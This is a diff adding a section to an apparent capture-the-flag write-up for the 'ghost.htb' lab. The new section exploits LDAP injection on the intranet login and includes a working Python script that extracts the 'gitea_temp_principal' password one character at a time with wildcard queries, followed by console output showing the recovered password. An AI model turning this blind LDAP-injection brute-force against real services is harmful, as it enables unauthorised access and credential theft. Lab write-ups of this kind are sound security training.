@@ -277,7 +277,7 @@ intranet                [Status: 307, Size: 3968, Words: 52, Lines: 1, Duration:
 :: Progress: [151265/151265] :: Job [1/1] :: 18 req/sec :: Duration: [1:23:25] :: Errors: 47 ::
 ```
 
-##### 1.3.2.1. Gitea
+### 1.4. Gitea
 
 Nothing much here:
 
@@ -289,7 +289,7 @@ Nothing much here:
 
 ![image](https://github.com/user-attachments/assets/5947dd59-d54d-4303-95c1-49edb124de4a)
 
-##### 1.3.2.2. Intranet
+### 1.5. Intranet
 
 ![image](https://github.com/user-attachments/assets/79f3c49d-ce45-4d07-9361-0b3521e5699f)
 
@@ -316,3 +316,83 @@ Test for LDAP injection by using `*` for both username and secret:
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md
 
 ![image](https://github.com/user-attachments/assets/3db318f7-e0b2-40f1-814a-65b47ab1bf52)
+
+### 1.6. Guessing password for `gitea_temp_principal`
+
+#### 1.6.1. Optiion 1: Burp Suite
+
+![image](https://github.com/user-attachments/assets/1092392d-13e4-4996-b159-3945e017720c)
+
+![image](https://github.com/user-attachments/assets/e4b221c6-b39b-4fbc-bcfa-2bc03a6eea4d)
+
+![image](https://github.com/user-attachments/assets/5b7bbc36-6f19-4e95-a078-c740d9664112)
+
+![image](https://github.com/user-attachments/assets/967202ae-85a5-490b-9f4f-6ef6c9f9000d)
+
+![image](https://github.com/user-attachments/assets/a2413aa3-e743-44be-92b6-913a23cea376)
+
+![image](https://github.com/user-attachments/assets/9a360cb5-76e3-48df-a59b-ab7ede2335a6)
+
+![image](https://github.com/user-attachments/assets/a2c5561d-face-4dad-a9c4-fe32ee644faa)
+
+#### 1.6.2. Option 2: Python script
+
+```py
+import string
+import requests
+
+url = 'http://intranet.ghost.htb:8008/login'
+
+headers = {
+    'Host': 'intranet.ghost.htb:8008',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Next-Action': 'c471eb076ccac91d6f828b671795550fd5925940',
+    'Connection': 'keep-alive'
+}
+
+files = {
+    '1_ldap-username': (None, 'gitea_temp_principal'),
+    '1_ldap-secret': (None, 's*'),
+    '0': (None, '[{},"$K1"]')
+}
+
+
+passw = ""
+while True:
+    for char in string.ascii_lowercase + string.digits:
+        files = {
+            '1_ldap-username': (None, 'gitea_temp_principal'),
+            '1_ldap-secret': (None, f'{passw}{char}*'),
+            '0': (None, '[{},"$K1"]')
+        }
+        res = requests.post(url, headers=headers, files=files)
+        if res.status_code == 303:
+            passw += char
+            print(f"Passwd: {passw}")
+            break
+    else:
+        break
+print(passw)
+```
+
+```console
+root@kali:~# python3 brute.py
+Passwd: s
+Passwd: sz
+Passwd: szr
+Passwd: szrr
+Passwd: szrr8
+Passwd: szrr8k
+Passwd: szrr8kp
+Passwd: szrr8kpc
+Passwd: szrr8kpc3
+Passwd: szrr8kpc3z
+Passwd: szrr8kpc3z6
+Passwd: szrr8kpc3z6o
+Passwd: szrr8kpc3z6on
+Passwd: szrr8kpc3z6onl
+Passwd: szrr8kpc3z6onlq
+Passwd: szrr8kpc3z6onlqf
+szrr8kpc3z6onlqf
+```
